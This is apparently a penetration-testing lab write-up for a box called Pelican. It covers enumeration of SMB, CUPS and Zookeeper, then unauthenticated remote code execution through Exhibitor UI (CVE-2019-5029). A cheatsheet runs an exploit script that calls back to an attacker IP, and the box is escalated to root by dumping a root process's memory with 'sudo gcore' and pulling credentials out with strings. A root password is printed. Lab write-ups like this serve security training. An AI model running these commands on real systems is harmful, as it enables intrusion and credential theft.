# Pelican \[Inter]

## Report

Exhibitor UI for Apache Zookeeper on port 8080 is vulnerable to unauthenticated RCE. User on webshell is able to run gcore as sudo which can dump info on a running process, we see a running process as root for 'password-store' at 513. Extract creds using 'strings'

## Cheatsheet

<pre><code>https://github.com/thehunt1s0n/Exihibitor-RCE?tab=readme-ov-file
<strong>./exploit.sh 192.168.178.98 8080 192.168.45.234 8000
</strong>sudo -l
ps aux [find PID 513 - /usr/bin/password-store]
sudo gcore 513 
strings core.513
</code></pre>

## Loot

### Enumeration

192.168.178.98

Watch for PRINTERS

#### SMB and RPC

No access for guest

```
print$
IPC$
```

{% code title="rpclient works but it shows WIndows privs???" %}
```
SeMachineAccountPrivilege 0:6 (0x0:0x6)
SeTakeOwnershipPrivilege 0:9 (0x0:0x9)
SeBackupPrivilege 0:17 (0x0:0x11)
SeRestorePrivilege 0:18 (0x0:0x12)
SeRemoteShutdownPrivilege 0:24 (0x0:0x18)
SePrintOperatorPrivilege 0:4097 (0x0:0x1001)
SeAddUsersPrivilege 0:4098 (0x0:0x1002)
SeDiskOperatorPrivilege 0:4099 (0x0:0x1003)
SeSecurityPrivilege 0:8 (0x0:0x8)
```
{% endcode %}

#### 631 - IPP (Internet Printing Protocol)

Server: CUPS/2.2 IPP/2.1 \[CUPS v2.2.10]

#### 8080 - Jetty (Not found)

#### 8081 - Zookeeper

4LTR - 4 letter words that return info about apache zookeeper

**stat**

`Zookeeper version: 3.4.6-1569965`&#x20;

**conf**

```
clientPort=2181
dataDir=/opt/zookeeper/version-2
dataLogDir=/zookeeper/data/version-2
tickTime=2000
maxClientCnxns=60
minSessionTimeout=4000
maxSessionTimeout=40000
serverId=0
```

### Attack Vectors

Exhibitor Web Ui 1.7.1 RCE, CVE-2019-5029

### PrivEsc

gcore can be run as SUDO

### Creds

root:ClogKingpinInning731

### Proof

um yeah about that lol
